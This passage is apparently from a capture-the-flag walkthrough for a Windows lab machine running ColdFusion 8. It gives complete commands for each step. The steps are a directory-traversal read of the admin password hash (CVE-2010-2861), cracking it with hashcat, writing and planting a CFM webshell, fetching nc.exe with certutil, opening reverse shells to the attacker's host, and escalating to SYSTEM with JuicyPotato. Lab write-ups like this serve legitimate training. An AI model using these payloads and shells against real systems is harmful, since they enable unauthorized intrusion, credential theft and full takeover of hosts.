## 2. Leak the Admin Password Hash

ColdFusion 8 is vulnerable to a directory traversal bug (CVE-2010-2861) via the `locale` parameter on the admin login page, letting you read arbitrary files with a null-byte trick:

```bash
curl -s 'http://10.129.1.28:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en' | grep password
```

You'll get a 40-character hex string — that length means it's SHA1.

📸 **Screenshot 4:** Leaked password hash from password.properties

## 3. Crack the Hash

```bash
echo "<hash>" > hash.txt
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt --show
```

Cracks to `happyday`.

## 5. Get Your ONE Foothold Shell (nc.exe directly — skip PowerShell)

Rather than doing a PowerShell one-liner shell first and then swapping to nc.exe later, just go straight to nc.exe. This is the shell you'll use for everything up to JuicyPotato.

**On Kali — host nc.exe and start your ONE persistent listener:**

```bash
# Terminal 1: web server to serve nc.exe
python3 -m http.server 80

# Terminal 2: your ONE foothold listener — keep this open for the rest of the box
rlwrap nc -lvnp 443
```

**Build a self-referencing CFM webshell** (needed to get command execution via a scheduled task):

```bash
cat > shell.cfm << 'EOF'
<html>
<body>
<cfoutput>
<form method="POST" action="shell.cfm">
<input type=text name="cmd" size=80
  <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>>
<input type=submit value="Exec">
</form>
<cfif isdefined("form.cmd")>
<cfexecute name="#Form.cmd#" arguments="" timeout="5"></cfexecute>
</cfif>
</cfoutput>
</body>
</html>
EOF
```

📸 **Screenshot 7:** Creating shell.cfm

**In ColdFusion Admin → Debugging & Logging → Scheduled Tasks → Schedule New Task:**

- URL: `http://YOUR_KALI_IP/shell.cfm`
- Save output to file: `C:\ColdFusion8\wwwroot\shell.cfm`
- Submit, then Run.

📸 **Screenshot 8:** Scheduled task configuration

**Visit the shell and pull nc.exe onto the target in one go:**

```
http://10.129.1.28:8500/CFIDE/administrator/shell.cfm
```

📸 **Screenshot 9:** Webshell live in browser

In the `cmd` field:

```
cmd.exe /c certutil -urlcache -split -f "http://YOUR_KALI_IP/nc.exe" C:\ProgramData\nc.exe
```

> 🔍 Full breakdown of the `certutil` flags and why this LOLBIN trick works: [[Privilege Escalation & Local Exploitation (Breakdowns)#certutil repurposed as a LOLBIN downloader|Command Breakdowns]]

(Grab `nc.exe` from https://github.com/int0x33/nc.exe if you don't have it locally, and drop it in the same folder you're serving with `python3 -m http.server 80`.)

**Now fire your ONE reverse shell — straight to nc.exe, no PowerShell step:**

```
cmd.exe /c C:\ProgramData\nc.exe 10.10.14.7 443 -e cmd.exe
```

Your Terminal 2 listener (port 443) catches a stable `cmd.exe` shell as `arctic\tolis`. This is the only shell you need until root.

## 7. Privilege Escalation — JuicyPotato (using the SAME shell)

Everything from here happens inside the one shell you already have. No new listener yet.

**Check the privilege exists:**

```cmd
whoami /priv
```

Look for `SeImpersonatePrivilege` = Enabled.

📸 **Screenshot 12:** whoami /priv output showing SeImpersonatePrivilege

**Get JuicyPotato onto the box** (same download pattern, same web server terminal from before):

```cmd
certutil -urlcache -split -f "http://YOUR_KALI_IP/JuicyPotato.exe" C:\ProgramData\JuicyPotato.exe
```

**Sanity-test JuicyPotato with a harmless .bat file first — no listener needed for this part:**

```cmd
echo whoami > C:\ProgramData\test.bat
C:\ProgramData\JuicyPotato.exe -l 1337 -p C:\ProgramData\test.bat -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
type C:\ProgramData\test.bat
```

If it now says `nt authority\system`, JuicyPotato works on this box with this CLSID. If it still says `arctic\tolis`, try a different CLSID from JuicyPotato's list for Server 2008 R2 before going further.

> 🔍 Full breakdown of every JuicyPotato flag, and what the CLSID actually is: [[Privilege Escalation & Local Exploitation (Breakdowns)#JuicyPotato: -l/-t/-c flags and the CLSID token-impersonation trick|Command Breakdowns]]

📸 **Screenshot 13:** .bat test confirming JuicyPotato flips to SYSTEM

## 8. Get Your SECOND (and last) Listener — SYSTEM Shell

**On Kali, Terminal 3:**

```bash
rlwrap nc -lvnp 4445
```

**Back in your existing nc.exe shell (still connected as tolis), fire JuicyPotato for real:**

```cmd
C:\ProgramData\JuicyPotato.exe -l 1338 -p C:\Windows\System32\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097} -a "/c C:\ProgramData\nc.exe 10.10.14.7 4445 -e cmd.exe"
```

(Use a different `-l` port than your test run, e.g. 1338, just to avoid any leftover binding conflicts.)

Your Terminal 3 listener catches a SYSTEM shell.

## Listener Count Recap

|Terminal|Purpose|Stays open until|
|---|---|---|
|1|`python3 -m http.server 80`|You've pulled down nc.exe, JuicyPotato.exe, shell.cfm — can close after|
|2|`nc -lvnp 443` — foothold shell|Root flag grabbed (this is your working shell the whole time)|
|3|`nc -lvnp 4445` — SYSTEM shell|Root flag grabbed|

That's it — one web server, one foothold shell, one SYSTEM shell. No PowerShell one-liner shell, no extra intermediate nc hop.

## Common Failure Points (recap)

|Symptom|Likely cause|Fix|
|---|---|---|
|JuicyPotato .bat test doesn't flip to SYSTEM|Wrong CLSID for this OS build, or `SeImpersonatePrivilege` disabled|Check `whoami /priv`; try alternate CLSIDs|
|`CreateProcessWithTokenW Failed`|nc.exe not referenced by full path|Always use `C:\ProgramData\nc.exe`, never bare `nc.exe`|
|No connection on final listener|Listener started after JuicyPotato ran, or `-l` port already bound from the test run|Start listener first; use a fresh `-l` port for the real run|
|Webshell 404s after scheduled task|Task didn't actually run, or saved to wrong path|Re-check "Save output to file" path matches ColdFusion's wwwroot exactly|
